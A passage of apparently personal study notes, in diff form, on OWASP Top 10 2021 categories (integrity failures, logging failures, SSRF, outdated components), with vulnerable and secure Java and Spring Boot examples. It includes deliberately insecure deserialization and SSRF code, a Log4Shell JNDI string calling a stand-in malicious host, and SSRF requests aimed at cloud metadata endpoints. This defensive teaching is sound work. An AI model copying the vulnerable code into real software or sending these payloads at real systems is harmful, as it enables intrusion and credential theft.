+        <servlet-name>VulnerableLoginServlet</servlet-name>
+        <servlet-class>com.example.VulnerableLoginServlet</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>VulnerableLoginServlet</servlet-name>
+        <url-pattern>/vulnerable-login</url-pattern>
+    </servlet-mapping>
+
+    <servlet>
+        <servlet-name>SecureLoginServlet</servlet-name>
+        <servlet-class>com.example.SecureLoginServlet</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>SecureLoginServlet</servlet-name>
+        <url-pattern>/secure-login</url-pattern>
+    </servlet-mapping>
+</web-app>
+
+📄 index.html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Demo</title>
+</head>
+<body>
+    <h2>Vulnerable Login</h2>
+    <form method="post" action="vulnerable-login">
+        Username: <input type="text" name="username" /><br/>
+        Password: <input type="password" name="password" /><br/>
+        <input type="submit" value="Login" />
+    </form>
+
+    <h2>Secure Login</h2>
+    <form method="post" action="secure-login">
+        Username: <input type="text" name="username" /><br/>
+        Password: <input type="password" name="password" /><br/>
+        <input type="submit" value="Login" />
+    </form>
+</body>
+</html>
+
+ Required Library for Secure Version
+You need to add the jBCrypt dependency manually if you're not using Maven:
+
+Download: jBCrypt JAR
+
+Or include it in Maven:
+
+<dependency>
+    <groupId>org.mindrot</groupId>
+    <artifactId>jbcrypt</artifactId>
+    <version>0.4</version>
+</dependency>
+
+
+8. A08:2021 – Software and Data Integrity Failures
+
+This is a new category for 2021 list and it focuses on making assumptions related to software updates, critical data, CICD pipelines without verifying the integrity of that software
+       For example where an appl relies on like plugins or libraries or some untrusted sources or repositories or an insecure CICD pipeline which introduce the potential for unauthorized access and malicious code those kinds of things which is not good
+     Now lot of appl include auto update functionality and these updates are downloaded without sufficient integrity verification, so if we are downloading something without checking the integrity of that download then thats a problem and attackers could come in and could potentially upload their own updates and then those could be distributed and run on all different installation so that is not good 
+     Consider we have home router which gives different wireless access, the router itself has firmware on it, so the router does not verify updates via signed firmware, so unsigned firmware could be a problem where attackers could come in and manipulate this firmware. We have IOT devices whether it is TV or refrigerator which are connected to internet and lot of these devices just dont update their software via verified sources
+       Consider we have monitoring software which is installed on variety of different endpoints, and that monitoring software is not updated and all organization in different endpoints is downloading the software from source, and attackers were able to get into different endpoints organization through this monitoring software 
+      In order to prevent this, use digital signatures or similar kind of mechanisms to verify the software or the data that we have from the expected source. We have to make sure libraries or dependencies are consuming from trusted repositories. Also we should have review process for code and configuration changes within ur organization, make sure ur CI CD pipeline has proper configuration and access control built-in to ensure the integrity of the code 
+
+
+It refers to failures in maintaining the trustworthiness of software or data during updates, CI/CD pipelines, or runtime.
+
+🔍 What Is It?
+This category focuses on:
+Insecure software updates or plugins
+CI/CD pipelines that allow tampering
+Deserialization of untrusted data
+Use of unsigned or unverified code
+Insecure dependency fetching (e.g., from untrusted sources)
+Attackers exploit these flaws to modify code, configuration, or data in transit or at rest.
+
+Examples of Vulnerabilities
+
+Insecure software update	- Update mechanism allows spoofed or unsigned packages
+CI/CD pipeline compromise -	Malicious code injected during build process
+Deserialization of untrusted data	- Leads to remote code execution
+Unsigned or unverified components -	Code from unknown or tampered sources
+Untrusted plugin/module loading	- Dynamic loading of modules without verification
+Lack of integrity checks -	No hash/signature verification on critical files or configs
+
+Real-World Cases
+1. SolarWinds Supply Chain Attack (2020)
+Attackers injected malicious code during the build process of the Orion software, affecting thousands of organizations.
+
+2. Event-Stream NPM Library
+A malicious contributor injected code into a widely used npm package that stole Bitcoin wallets.
+
+3. Insecure Jenkins plugins
+Allow attackers to alter CI/CD workflows or deploy malware.
+
+Impact
+Remote code execution (RCE)
+Data tampering or destruction
+Malicious software deployment
+Supply chain compromise
+
+How to Prevent It
+Signed updates -	Verify digital signatures of all update packages
+Secure CI/CD -	Harden your build pipelines with access control and artifact signing
+Use trusted sources - Lock dependencies to known-good versions (SBOM)
+Verify integrity of code -	Use SHA-256 hashes and digital signatures
+Restrict dynamic code execution -	Avoid deserialization of untrusted data
+Run dependency scanners -	Use OWASP Dependency-Track, Snyk, etc.
+Isolate environments -	Use sandboxing and container hardening
+
+Example: Insecure Deserialization in Java
+
+// ⚠️ Dangerous: accepting serialized objects from untrusted source
+ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
+MyObject obj = (MyObject) ois.readObject(); // RCE vulnerability
+
+✅ Safe Alternative
+Never deserialize from untrusted sources.
+Use a secure data format (JSON, protobuf) with strict schema validation.
+
+
+Vulnerable Deserialization Example (Java)
+🔥 VulnerableServer.java
+
+package com.example;
+
+import java.io.*;
+import java.net.ServerSocket;
+import java.net.Socket;
+
+public class VulnerableServer {
+    public static void main(String[] args) throws Exception {
+        ServerSocket serverSocket = new ServerSocket(9999);
+        System.out.println("Listening for connections on port 9999...");
+
+        Socket clientSocket = serverSocket.accept();
+        ObjectInputStream ois = new ObjectInputStream(clientSocket.getInputStream());
+
+        // ⚠️ Insecure: Deserializing untrusted data can lead to RCE
+        Object obj = ois.readObject();
+        System.out.println("Deserialized object: " + obj);
+
+        ois.close();
+        clientSocket.close();
+        serverSocket.close();
+    }
+}
+
+This server will accept any serialized Java object over TCP port 9999 and deserialize it without validation — a known RCE vector.
+
+⚠️ Client to Send Serialized Object to Vulnerable Server
+📄 ExploitClient.java (for port 9999)
+
+package com.example;
+
+import java.io.*;
+import java.net.Socket;
+
+// This is the object we'll send to simulate a deserialization attack
+class ExploitPayload implements Serializable {
+    private static final long serialVersionUID = 1L;
+
+    @Override
+    public String toString() {
+        // In a real-world attack, this could execute system commands.
+        return "⚠️ Malicious payload executed!";
+    }
+}
+
+public class ExploitClient {
+    public static void main(String[] args) throws Exception {
+        Socket socket = new Socket("localhost", 9999);
+        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
+
+        // Send malicious object
+        oos.writeObject(new ExploitPayload());
+
+        oos.close();
+        socket.close();
+        System.out.println("Exploit sent to vulnerable server.");
+    }
+}
+
+- Run VulnerableServer
+- Run ExploitClient
+
+✅ Secure Alternative
+🛡️ SecureServer.java
+
+package com.example;
+
+import java.io.*;
+import java.net.ServerSocket;
+import java.net.Socket;
+
+public class SecureServer {
+    public static void main(String[] args) throws Exception {
+        ServerSocket serverSocket = new ServerSocket(9998);
+        System.out.println("Secure server listening on port 9998...");
+
+        Socket clientSocket = serverSocket.accept();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
+
+        // ✅ Safe: Reading plain text input, not serialized Java objects
+        String input = reader.readLine();
+        System.out.println("Received message: " + input);
+
+        reader.close();
+        clientSocket.close();
+        serverSocket.close();
+    }
+}
+This version avoids deserialization entirely by reading string data (e.g., JSON) and is suitable for secure communication with defined protocols.
+
+✅ Client to Send Plain Text to Secure Server
+📄 SafeClient.java (for port 9998)
+
+package com.example;
+
+import java.io.*;
+import java.net.Socket;
+
+public class SafeClient {
+    public static void main(String[] args) throws Exception {
+        Socket socket = new Socket("localhost", 9998);
+        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
+
+        // Send safe plain text
+        writer.write("Hello from SafeClient!\n");
+        writer.flush();
+
+        writer.close();
+        socket.close();
+        System.out.println("Message sent to secure server.");
+    }
+}
+
+- Run SecureServer
+- Run SafeClient
+
+
+
+9. A09:2021 – Security Logging and Monitoring Failures
+
+This came up from 10th position in 2017 list 
+     Consider we have an appl which perform many processing and we have users that are accessing ur appl and we need to do some logging on this, so do we do sufficent logging and do we monitor the logs. If we have auditable events like fail logins or high value transactions, if those are not logged then it is a problem 
+     If logs are only stored locally and there is no backup, there should be appropriate alerting thresholds and response escalation process and if those are not then it is problem 
+     Consider we have health plan provider and their website is attacked and patient datas are out, but the website operator couldnt detect that because thresholds are not in place or warnings or alerts are not in place, they didnt log in and they didnt monitor it. Maybe an external 3rd party to inform this health plan provider that an attacker had already accessed and modified these sensitive health records of patients 
+     Lets say that you are an airline and we have data lost that involves 10 yrs worth personal data like millions of passengers passport number, credit card number etc, then we realize that the problem occured at 3rd part cloud hosting provider that we use and they are actually notified you about the  data lost, so that could be a problem if we got some 3rd party hosting provider that u r relying on and they dont do sufficient logging and  monitoring 
+      In order to prevent this, we can ensure that all ur login and access control, server side input validation failures can be logged, and also we make sure that there are enough context in the logs to identify suspicious activity. We can hold the logs for long enough for forensic analysis, also ensure ur log data is encoded correctly to prevent things like injections or attacks on logging and monitoring systems, there was a recent attack on log4j which was an attack on the logging and monitoring system. Also adopt an incident response plan or recovery plan so if and when you are attacked and we need to plan to recover from that problems
+
+It refers to the lack of proper visibility into security-relevant events, making it difficult to detect, respond to, or investigate attacks.
+
+What Is It?
+This category covers failures in detecting and logging suspicious behavior, such as:
+Lack of logs for authentication attempts or privilege changes
+Incomplete or missing error logging
+Not monitoring for anomalies or known attacks
+Logs stored insecurely or with sensitive data exposed
+Not integrating with SIEM (Security Information and Event Management)
+
+Why It Matters
+You can’t stop what you can’t see.
+Without proper logging and monitoring:
+Attacks go undetected
+Incident response is delayed
+Post-incident investigations are incomplete
+Compliance requirements may be violated (e.g., GDPR, PCI-DSS)
+
+Common Vulnerabilities
+No login failure logging -	Brute force attacks go unnoticed
+Logs lack user context - 	“Error occurred” with no user ID or IP
+Sensitive data in logs -	Passwords or tokens written in logs
+No alerting or correlation	 -Log entries are isolated; no pattern detection
+Insecure log storage -	Logs readable by unauthorized users
+Lack of tamper-proofing	- Attackers can alter or erase logs
+
+💥 Real-World Impact
+Equifax breach (2017): Failed to detect months of exploitation of a known vulnerability.
+Capital One breach: Poor monitoring led to a delayed detection of a misconfigured WAF.
+
+✅ Best Practices
+Log all authentication events -	Both success and failure
+Contextual logging	-User ID, IP, timestamp, action
+Avoid logging sensitive data-	No passwords, tokens, credit card numbers
+Real-time monitoring-	Integrate with SIEM/SOC tools
+Protect log files-	File permissions, encryption, rotation
+Alert on suspicious activity-	Multiple failures, privilege escalation
+Audit logging	-Log config changes, deletions, system access
+
+🧪 Insecure vs Secure Logging in Java
+❌ Insecure Logging Example
+
+logger.info("Login failed for user " + username + " with password " + password); // ❌ leaks sensitive data
+
+✅ Secure Logging Example
+
+logger.warn("Login failed for user {}", username); // No password leak
+
+Tools for Logging & Monitoring
+Logback, Log4j2, SLF4J – Java logging frameworks
+ELK Stack (Elasticsearch, Logstash, Kibana) – Log aggregation & visualization
+SIEM tools – Splunk, QRadar, Wazuh
+Application Performance Monitoring – Datadog, New Relic
+
+✅ Java Logging Demo – A09:2021 (Logging and Monitoring Failures)
+🗂️ Project Structure
+
+LoggingMonitoringDemo/
+├── src/
+│   └── com/
+│       └── example/
+│           └── LoginLogger.java
+├── resources/
+│   └── log4j2.xml
+
+📄 LoginLogger.java
+
+package com.example;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class LoginLogger {
+    private static final Logger logger = LogManager.getLogger(LoginLogger.class);
+
+    public static void main(String[] args) {
+        String username = "user1";
+        String password = "password123"; // This should NOT be logged
+
+        // ❌ BAD PRACTICE: Logging sensitive data
+        logger.info("Login attempt with username: {} and password: {}", username, password);
+
+        // ✅ GOOD PRACTICE: Log only essential information
+        logger.warn("Login failed for username: {}", username);
+    }
+}
+
+📄 log4j2.xml (inside resources/)
+
+<?xml version="1.0" encoding="UTF-8"?>
+<Configuration status="WARN">
+    <Appenders>
+        <Console name="ConsoleAppender" target="SYSTEM_OUT">
+            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n"/>
+        </Console>
+        <File name="FileAppender" fileName="logs/app.log">
+            <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n"/>
+        </File>
+    </Appenders>
+    <Loggers>
+        <Root level="info">
+            <AppenderRef ref="ConsoleAppender"/>
+            <AppenderRef ref="FileAppender"/>
+        </Root>
+    </Loggers>
+</Configuration>
+
+How to Run
+Add Log4j2 dependencies via Maven:
+
+<dependencies>
+    <dependency>
+        <groupId>org.apache.logging.log4j</groupId>
+        <artifactId>log4j-api</artifactId>
+        <version>2.20.0</version>
+    </dependency>
+    <dependency>
+        <groupId>org.apache.logging.log4j</groupId>
+        <artifactId>log4j-core</artifactId>
+        <version>2.20.0</version>
+    </dependency>
+</dependencies>
+
+Compile and run:
+
+javac -cp ".;path/to/log4j2/*.jar" com/example/LoginLogger.java
+java -cp ".;resources;path/to/log4j2/*.jar" com.example.LoginLogger
+
+
+10. A10:2021 – Server-Side Request Forgery (SSRF)
+
+This is a new category added in 2021 list. This occurs when a web appl fetches a remote resource without validating a user supplied url, so it effectively allows an attacker to force the appl to send request to an unexpected destination, even when that destination is protected by firewall or vpn 
+     Consider there is an shopping appl and we have users to access ur appl, one of feature of the shopping appl is allow the user to check and see if an item is in stock by sending a query to backend rest api, then api endpoint returns and then the appl returns to the user. In typical scenario what could happen is the user sends http POST request, the appl sends stock api call to restful api endpoint and then it sends back the information
+     In server side request forgery, we take appl server and forge a request to an unexpected endpoint and we are going to get back information that u should not have been able to get back. So attacker can modify all this url like /admin  and request the url on server as /admin and the appl server is going to fetch the contents of /admin url and return back to attackers 
+     So the attacker is going to forge the request and use the server to access the url, because the server is a known trusted place, so the contents of url from the server request are going to return to the attacker 
+     To prevent this, we have some network layer where we can segment out ur remote resource functionality in separate networks and then that reduces the impact of SSRF. We can also enforce a deny by default firewall policy at network level. Next is log all ur accepted and blocked network flows on the firewall 
+         
+
+It refers to a vulnerability where a server is tricked into making unintended requests to internal or external systems.
+
+What Is SSRF?
+In SSRF, an attacker abuses a server's ability to send HTTP requests to:
+Access internal systems (e.g., http://localhost, http://127.0.0.1, or cloud metadata)
+Interact with private APIs
+Bypass firewalls and security controls
+The server acts as a proxy for the attacker.
+
+Common SSRF Attack Vectors
+Source					Target (Forged by Attacker)					Result
+File upload scanner	http://localhost/admin							Internal admin access
+Image fetcher			http://169.254.169.254/latest/meta-data/		AWS metadata exposure
+Webhook tester			http://127.0.0.1:8080/debug					Debug panel access
+
+Potential Impact
+Internal network scanning
+Access to cloud provider metadata (e.g., AWS IAM tokens)
+Remote Code Execution (via local admin interfaces)
+Data exfiltration or privilege escalation
+
+Why It Happens
+Trusting user-supplied URLs without validation
+Making server-to-server HTTP requests (e.g., image loading, webhook calls)
+Lack of filtering for private/internal IP ranges
+
+SSRF Vulnerable Code Example (Java)
+❌ Unsafe URL Fetcher
+
+String url = request.getParameter("url"); // e.g., attacker-controlled
+InputStream in = new URL(url).openStream(); // SSRF risk: could hit localhost, internal services
+
+✅ How to Prevent SSRF
+Allowlist URLs/domains	-Only allow known safe destinations
+Block internal IP ranges-	Prevent access to 127.0.0.1, 169.254.*.*, etc.
+DNS pinning	-Prevent DNS rebinding
+Metadata API protections	-Disable access to cloud metadata or restrict via IAM
+Timeout and response limits-	Prevent resource exhaustion
+Logging and monitoring	-Detect unexpected outbound requests
+
+Useful Tools
+Burp Suite – SSRF testing
+SSRFmap – Automate SSRF exploitation
+AWS: Enable IMDSv2 to protect against SSRF
+
+Project: SSRFDemo – Server-Side Request Forgery
+
+SSRFDemo/
+├── src/
+│   └── com/
+│       └── example/
+│           ├── VulnerableSSRFServlet.java
+│           └── SecureSSRFServlet.java
+├── WebContent/
+│   ├── index.html
+│   └── WEB-INF/
+│       └── web.xml
+
+📄 VulnerableSSRFServlet.java (❌ Vulnerable)
+
+package com.example;
+
+import java.io.*;
+import java.net.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+
+public class VulnerableSSRFServlet extends HttpServlet {
+    protected void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        String url = request.getParameter("url");
+
+        PrintWriter out = response.getWriter();
+        response.setContentType("text/plain");
+
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(new URL(url).openStream()))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                out.println(line);
+            }
+        } catch (Exception e) {
+            out.println("Error fetching URL: " + e.getMessage());
+        }
+    }
+}
+
+📄 SecureSSRFServlet.java (✅ Safe with Allowlist)
+
+package com.example;
+
+import java.io.*;
+import java.net.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+import java.util.*;
+
+public class SecureSSRFServlet extends HttpServlet {
+    private static final Set<String> ALLOWED_HOSTS = new HashSet<>(Arrays.asList(
+        "example.com", "api.example.com"
+    ));
+
+    protected void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        String urlParam = request.getParameter("url");
+
+        PrintWriter out = response.getWriter();
+        response.setContentType("text/plain");
+
+        try {
+            URL url = new URL(urlParam);
+            String host = url.getHost();
+
+            if (!ALLOWED_HOSTS.contains(host)) {
+                out.println("Access denied to host: " + host);
+                return;
+            }
+
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    out.println(line);
+                }
+            }
+        } catch (Exception e) {
+            out.println("Error fetching URL: " + e.getMessage());
+        }
+    }
+}
+
+📄 web.xml
+
+<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="3.0">
+    <servlet>
+        <servlet-name>VulnerableSSRFServlet</servlet-name>
+        <servlet-class>com.example.VulnerableSSRFServlet</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>VulnerableSSRFServlet</servlet-name>
+        <url-pattern>/vulnerable-ssrf</url-pattern>
+    </servlet-mapping>
+
+    <servlet>
+        <servlet-name>SecureSSRFServlet</servlet-name>
+        <servlet-class>com.example.SecureSSRFServlet</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>SecureSSRFServlet</servlet-name>
+        <url-pattern>/secure-ssrf</url-pattern>
+    </servlet-mapping>
+</web-app>
+
+📄 index.html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Demo</title>
+</head>
+<body>
+    <h2>Vulnerable SSRF Request</h2>
+    <form method="get" action="vulnerable-ssrf">
+        URL: <input type="text" name="url" value="http://example.com" size="50" />
+        <input type="submit" value="Fetch" />
+    </form>
+
+    <h2>Secure SSRF Request</h2>
+    <form method="get" action="secure-ssrf">
+        URL: <input type="text" name="url" value="http://example.com" size="50" />
+        <input type="submit" value="Fetch" />
+    </form>
+</body>
+</html>
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+10. Server-Side Request Forgery
+Server-Side Request Forgery (SSRF) is a security vulnerability that allows an attacker to make the server perform unintended requests on their behalf—typically to internal services or trusted networks the attacker doesn't have direct access to.
+
+How SSRF Works
+In SSRF, the attacker tricks the server into sending a crafted request to:
+1. Internal services (e.g., http://localhost, http://127.0.0.1, http://169.254.169.254)
+2. Other web servers on the internal network (e.g., http://internal-db:8080)
+3. Cloud metadata services (AWS/GCP/Azure) to steal credentials
+
+Example Scenario
+Imagine a web app where users can fetch content from a URL:
+
+GET /fetch?url=http://example.com
+
+If not validated, an attacker could send:
+
+GET /fetch?url=http://localhost:8080/admin
+
+This would make the server itself send the request to localhost:8080, potentially exposing internal-only services.
+
+Risks of SSRF
+1. Exfiltration of cloud credentials from metadata endpoints
+2. Port scanning of internal services
+3. Accessing internal admin panels
+4. Bypassing firewalls or network isolation
+
+How to Prevent SSRF
+1. Validate and whitelist external URLs
+2. Block private/internal IPs (127.0.0.1, 169.254.*, 10.*, etc.)
+3. Disable URL-based functionality unless absolutely necessary
+4. Block URL schemes like file://, gopher://, etc.
+5. Log and monitor all outbound traffic
+6. Use network segmentation and firewalls to restrict server access
+
+
+
+Vulnerable SSRF Example in Spring Boot
+This application takes a URL as input from the user and fetches its content. If not validated properly, this can lead to SSRF, allowing attackers to access internal services (e.g., http://localhost:8080/admin, http://metadata.google.internal).
+
+SSRFController.java (VULNERABLE)
+
+@RestController
+@RequestMapping("/ssrf")
+public class SSRFController {
+
+    @GetMapping("/fetch")
+    public String fetchUrlContent(@RequestParam String url) {
+        try {
+            URL targetUrl = new URL(url);
+            BufferedReader in = new BufferedReader(new InputStreamReader(targetUrl.openStream()));
+            return in.lines().collect(Collectors.joining("\n"));
+        } catch (Exception e) {
+            return "Error: " + e.getMessage();
+        }
+    }
+}
+
+Test with:
+
+GET /ssrf/fetch?url=http://localhost:8080/actuator/env
+GET /ssrf/fetch?url=http://169.254.169.254/latest/meta-data
+
+These URLs can access internal resources or metadata from cloud instances. That’s SSRF in action.
+
+Secured Version with SSRF Protection
+We’ll validate the input to only allow external URLs from trusted domains and block internal IP ranges.
+
+SafeSSRFController.java (SECURE)
+
+@RestController
+@RequestMapping("/ssrf-safe")
+public class SafeSSRFController {
+
+    private static final List<String> ALLOWED_DOMAINS = List.of("example.com", "api.publicservice.com");
+
+    @GetMapping("/fetch")
+    public String fetchSafeUrl(@RequestParam String url) {
+        try {
+            URI uri = new URI(url);
+            String host = uri.getHost();
+
+            if (host == null || isInternalIP(host) || !isAllowedDomain(host)) {
+                return "Access denied: Unsafe or disallowed host.";
+            }
+
+            HttpURLConnection connection = (HttpURLConnection) uri.toURL().openConnection();
+            connection.setConnectTimeout(3000);
+            connection.setReadTimeout(3000);
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
+                return reader.lines().collect(Collectors.joining("\n"));
+            }
+
+        } catch (Exception e) {
+            return "Error: " + e.getMessage();
+        }
+    }
+
+    private boolean isAllowedDomain(String host) {
+        return ALLOWED_DOMAINS.stream().anyMatch(host::endsWith);
+    }
+
+    private boolean isInternalIP(String host) {
+        try {
+            InetAddress address = InetAddress.getByName(host);
+            return address.isAnyLocalAddress() ||
+                   address.isLoopbackAddress() ||
+                   address.isSiteLocalAddress() ||
+                   host.startsWith("169.254") ||
+                   host.startsWith("127.") ||
+                   host.equals("localhost");
+        } catch (Exception e) {
+            return true; // Block unknown/invalid hosts
+        }
+    }
+}
+
+How to Test:
+1. Run the app with Spring Boot (mvn spring-boot:run).
+
+2. Access:
+
+http://localhost:8080/ssrf-safe/fetch?url=https://example.com
+
+3. Requests to unsafe hosts like:
+
+http://localhost:8080/ssrf-safe/fetch?url=http://localhost:8080
+
+will return:
+
+Access denied: Unsafe or disallowed host.
+
+Additional Best Practices for SSRF Prevention
+Use whitelisting instead of blacklisting.
+
+Disallow non-HTTP(S) schemes (like file://, ftp://, gopher://).
+
+Restrict the IP ranges to avoid internal services access.
+
+Log all outbound requests and consider adding rate limits.
+
+
+8. What is Software & Data Integrity Failure?
+This occurs when:
+
+The application fails to verify software integrity, such as using unsigned or tampered dependencies or libraries.
+
+It trusts serialized data from untrusted sources.
+
+It fails to validate uploaded content or configuration changes.
+
+Vulnerable Examples in Spring Boot
+❌ 1. Untrusted Deserialization
+
+@RestController
+public class DeserializeController {
+
+    @PostMapping("/deserialize")
+    public String deserializeData(@RequestBody byte[] data) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
+        Object obj = ois.readObject();  // DANGEROUS!
+        return obj.toString();
+    }
+}
+🔴 Issue: Attackers can send malicious serialized objects leading to remote code execution (RCE) or denial of service.
+
+✅ Secure Alternative: Use JSON and Validate Schema
+
+@RestController
+public class SafeDeserializeController {
+
+    public static class UserInput {
+        public String name;
+        public int age;
+    }
+
+    @PostMapping("/deserialize-safe")
+    public String safeDeserialize(@RequestBody @Valid UserInput input) {
+        return "Received: " + input.name;
+    }
+}
+✔️ Fixes:
+
+Avoid native Java serialization.
+Use JSON or XML with validation.
+Add class-based deserialization controls if absolutely needed.
+
+❌ 2. Unverified Dependency Download
+Example: Using external JARs or plugins without integrity checks.
+
+<!-- pom.xml -->
+<dependency>
+  <groupId>com.unknown.vendor</groupId>
+  <artifactId>external-lib</artifactId>
+  <version>1.0.0</version>
+</dependency>
+
+🔴 Issue: If the source is compromised or tampered, malicious code gets into your app.
+
+✅ Secure Practice:
+Use only trusted repositories (Maven Central, internal Nexus).
+Use dependency scanning tools like OWASP Dependency-Check,Snyk,Maven Enforcer Plugin
+
+mvn org.owasp:dependency-check-maven:check
+
+❌ 3. Unsigned File Uploads with Dangerous Content
+
+@PostMapping("/upload")
+public String uploadFile(@RequestParam("file") MultipartFile file) throws IOException {
+    byte[] bytes = file.getBytes();
+    Files.write(Path.of("/uploads/" + file.getOriginalFilename()), bytes);
+    return "Uploaded!";
+}
+
+🔴 Issue: No file type validation or integrity check — can lead to malware uploads or overwriting critical files.
+
+✅ Secure File Upload with Type & Signature Check
+
+@PostMapping("/upload-safe")
+public String safeUpload(@RequestParam("file") MultipartFile file) throws IOException {
+    String fileType = Files.probeContentType(file.getResource().getFile().toPath());
+    if (!fileType.startsWith("image/")) {
+        return "Unsupported file type!";
+    }
+
+    // (Optional) Check file hash/signature
+    MessageDigest md = MessageDigest.getInstance("SHA-256");
+    byte[] digest = md.digest(file.getBytes());
+    String hex = Base64.getEncoder().encodeToString(digest);
+    // Compare with known signature if needed
+
+    Files.copy(file.getInputStream(), Path.of("/uploads/" + file.getOriginalFilename()));
+    return "File uploaded securely.";
+}
+
+Additional Best Practices
+Area	                			Best Practice
+Dependencies	          Pin versions, use verified sources, sign releases
+Config integrity	       Use Spring Cloud Config with encryption and signatures
+Build pipeline	       Enable checksum/hash validation for JARs & Docker images
+CI/CD controls	       Restrict who can deploy, use immutable builds
+Serialization       	Avoid or validate with allow-list classes only
+File Uploads	     Validate content-type, size, extension, and store in safe directory
+
+✅ Summary Table
+Vulnerability					Cause											Fix
+Untrusted Deserialization	Deserializing unvalidated input	Use JSON/XML + schema 																							validation
+Dependency Tampering	   Using unsigned or unknown libs	Signed, scanned, and 																					pinned libraries
+Dangerous Uploads			No file validation					Content-type check + size 																						+ checksum
+
+
+
+
+6. What Are Vulnerable and Outdated Components?
+This happens when your application uses:
+
+Outdated libraries, frameworks, or plugins
+Components with known security vulnerabilities
+Dependencies from untrusted sources
+
+Attackers can exploit these to escalate privileges, bypass authentication, or execute remote code.
+
+VULNERABLE SPRING BOOT EXAMPLE
+Scenario: Spring Boot 2.6.0 with Log4j 2.14.1 (vulnerable to Log4Shell)
+
+<!-- pom.xml -->
+<parent>
+    <groupId>org.springframework.boot</groupId>
+    <artifactId>spring-boot-starter-parent</artifactId>
+    <version>2.6.0</version> <!-- ⚠️ old version -->
+</parent>
+
+<dependencies>
+    <dependency>
+        <groupId>org.springframework.boot</groupId>
+        <artifactId>spring-boot-starter-web</artifactId>
+    </dependency>
+
+    <!-- Explicitly adding old Log4j -->
+    <dependency>
+        <groupId>org.apache.logging.log4j</groupId>
+        <artifactId>log4j-core</artifactId>
+        <version>2.14.1</version> <!-- ⚠️ vulnerable version -->
+    </dependency>
+</dependencies>
+
+⚠️ Risk:
+log4j-core:2.14.1 is vulnerable to Log4Shell (CVE-2021-44228) – attackers can trigger RCE by injecting a JNDI lookup string in logs:
+
+// Dangerous log line
+logger.error("User input: " + userInput);
+
+If userInput = ${jndi:ldap://malicious.com/exploit}, it may cause remote code execution.
+
+🛡️ FIX — Updated and Hardened Version
+✅ Safe pom.xml
+
+<parent>
+    <groupId>org.springframework.boot</groupId>
+    <artifactId>spring-boot-starter-parent</artifactId>
+    <version>3.2.0</version> <!-- Updated Spring Boot -->
+</parent>
+
+<dependencies>
+    <dependency>
+        <groupId>org.springframework.boot</groupId>
+        <artifactId>spring-boot-starter-web</artifactId>
+    </dependency>
+
+    <!-- Use logback or updated log4j with mitigations -->
+    <dependency>
+        <groupId>ch.qos.logback</groupId>
+        <artifactId>logback-classic</artifactId>
+    </dependency>
+</dependencies>
+
+🔍 How to DETECT Vulnerable Dependencies
+✅ Use OWASP Dependency Check (Maven Plugin)
+
+<plugin>
+    <groupId>org.owasp</groupId>
+    <artifactId>dependency-check-maven</artifactId>
+    <version>8.4.0</version>
+    <executions>
+        <execution>
+            <goals>
+                <goal>check</goal>
+            </goals>
+        </execution>
+    </executions>
+</plugin>
+
+🧪 Run:
+mvn verify
+
+It will generate dependency-check-report.html with CVEs and risk scores.
+
+✅ Additional Tools to Detect and Prevent
+Tool	Description
+Snyk	Scans your code, Dockerfiles, and pom.xml for known vulnerabilities
+Dependabot	GitHub feature to auto-update vulnerable dependencies
+CycloneDX + SBOM	Generates software bill of materials for security audits
+
+🔐 Secure Development Best Practices
+Practice	Recommendation
+Pin dependency versions	Avoid floating versions (e.g., 2.+)
+Use official repositories	Avoid using custom/unknown artifact repos
+Monitor CVEs	Subscribe to NVD or use scanning tools
+Automated CI/CD scanning	Integrate dependency-check or Snyk into pipelines
+Apply updates regularly	Keep Spring Boot, Tomcat, and third-party libs current
+
+✅ Summary
+Item	Vulnerable Example	Secure Fix
+Spring Boot Version	2.6.0	3.2.0 or latest LTS
+Log4j Version	2.14.1 (Log4Shell)	2.17.1+ or use logback
+Detection	Manual checks, no automation	Dependency scanning (OWASP, Snyk)
+Prevention	Manual versioning	CI/CD auto-scanning + GitHub Dependabot
+
+
+Vulnerable Dependency Demo
+
+@RestController
+@RequestMapping("/log")
+class LoggingController {
+    private static final Logger logger = LogManager.getLogger(LoggingController.class);
+
+    @GetMapping("/input")
+    public String logUserInput(@RequestParam String userInput) {
+        logger.info("User input: " + userInput);  // Potential Log4Shell risk if using vulnerable Log4j
+        return "Logged input.";
+    }
+}
+
+/*
+ * Vulnerable pom.xml (for demonstration only)
+ *
+ * DO NOT use in production!
+ */
+
+/**
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+    <groupId>com.example</groupId>
+    <artifactId>vulnerabledemo</artifactId>
+    <version>0.0.1-SNAPSHOT</version>
+    <packaging>jar</packaging>
+    <name>vulnerabledemo</name>
+
+    <parent>
+        <groupId>org.springframework.boot</groupId>
